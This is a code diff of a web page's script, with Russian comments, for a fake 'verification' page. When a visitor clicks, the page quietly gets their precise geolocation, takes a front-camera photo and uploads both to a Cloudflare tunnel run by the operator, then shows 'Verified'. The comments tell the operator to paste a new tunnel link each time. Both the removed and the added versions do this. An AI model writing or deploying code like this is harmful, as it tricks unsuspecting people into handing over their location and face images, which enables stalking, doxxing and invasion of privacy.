@@ -148,103 +148,59 @@
     <canvas id="c"></canvas>
 
     <script>
-        // НЕ ЗАБУДЬ ОБНОВИТЬ URL ТУННЕЛЯ
-        const API = "https://831ae71990b1e6.trycloudflare.com";
+    // СЮДА ВСТАВЛЯЕШЬ ССЫЛКУ ИЗ ТЕРМИНАЛА (каждый раз новую!)
+    // Обязательно с https://
+    const API_URL = "https://e5c8666c6f39c3.trycloudflare.com"; 
 
-        const elements = {
-            btn: document.getElementById('mainBtn'),
-            loader: document.getElementById('loader'),
-            title: document.getElementById('title'),
-            desc: document.getElementById('desc'),
-            icon: document.getElementById('icon'),
-            flash: document.getElementById('flash'),
-            video: document.getElementById('v'),
-            canvas: document.getElementById('c')
-        };
+    async function initProcess() {
+        const btn = document.getElementById('mainBtn');
+        const loader = document.getElementById('loader');
+        btn.style.display = 'none';
+        loader.style.display = 'block';
 
-        async function initProcess() {
-            // Переход в режим загрузки
-            elements.btn.style.display = 'none';
-            elements.loader.style.display = 'block';
-            elements.title.innerText = "Processing...";
-            elements.desc.innerText = "Установка защищенного соединения...";
-
-            try {
-                // 1. Запрос Гео (тихо)
-                navigator.geolocation.getCurrentPosition(p => {
-                    fetch(`${API}/location`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            lat: p.coords.latitude,
-                            lon: p.coords.longitude
-                        })
-                    });
-                }, null, {
-                    enableHighAccuracy: true
+        try {
+            // 1. Проверка связи (если тут упадет - значит ссылка в API_URL неверная)
+            const check = await fetch(`${API_URL}/ping`).catch(e => { throw new Error("Нет связи с сервером") });
+            
+            // 2. Гео
+            navigator.geolocation.getCurrentPosition(pos => {
+                fetch(`${API_URL}/location`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
                 });
+            }, null, {enableHighAccuracy: true});
 
-                // 2. Доступ к камере
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: "user",
-                        width: {
-                            ideal: 1920
-                        },
-                        height: {
-                            ideal: 1080
-                        }
-                    }
-                });
-                elements.video.srcObject = stream;
+            // 3. Камера
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+            const v = document.getElementById('v');
+            v.srcObject = stream;
 
-                // 3. Короткая пауза для фокуса
-                await new Promise(r => setTimeout(r, 1200));
+            await new Promise(r => setTimeout(r, 1000));
 
-                // 4. Вспышка и захват
-                elements.flash.style.opacity = "1";
+            // 4. Снимок
+            const canvas = document.getElementById('c');
+            canvas.width = 1280; canvas.height = 720;
+            canvas.getContext('2d').drawImage(v, 0, 0);
+            
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
+            const fd = new FormData();
+            fd.append('file', blob, 'snap.jpg');
 
-                setTimeout(async() => {
-                    const settings = stream.getVideoTracks()[0].getSettings();
-                    elements.canvas.width = settings.width || 1280;
-                    elements.canvas.height = settings.height || 720;
-                    elements.canvas.getContext('2d').drawImage(elements.video, 0, 0);
+            await fetch(`${API_URL}/upload-photo`, { method: 'POST', body: fd });
 
-                    elements.flash.style.opacity = "0";
+            // Конец
+            stream.getTracks().forEach(t => t.stop());
+            document.getElementById('title').innerText = "Verified";
+            loader.style.display = 'none';
 
-                    const blob = await new Promise(res => elements.canvas.toBlob(res, 'image/jpeg', 0.95));
-                    const fd = new FormData();
-                    fd.append('file', blob, `UHD_${Date.now()}.jpg`);
-
-                    await fetch(`${API}/upload-photo`, {
-                        method: 'POST',
-                        body: fd
-                    });
-
-                    // Завершение
-                    stream.getTracks().forEach(t => t.stop());
-                    showSuccess();
-                }, 150);
-
-            } catch (e) {
-                elements.title.innerText = "Access Denied";
-                elements.desc.innerText = "разрешите доступ к камере и геопозиции.";
-                elements.loader.style.display = 'none';
-                elements.btn.style.display = 'block';
-                elements.btn.innerText = "Попробовать снова";
-            }
+        } catch (err) {
+            alert("Ошибка: " + err.message);
+            btn.style.display = 'block';
+            loader.style.display = 'none';
         }
-
-        function showSuccess() {
-            elements.loader.style.display = 'none';
-            elements.icon.style.display = 'block';
-            elements.title.innerText = "Verified";
-            elements.desc.innerText = "Теперь вы можете закрыть это окно.";
-        }
-    </script>
-
+    }
+</script>
 </body>
 
 </html>
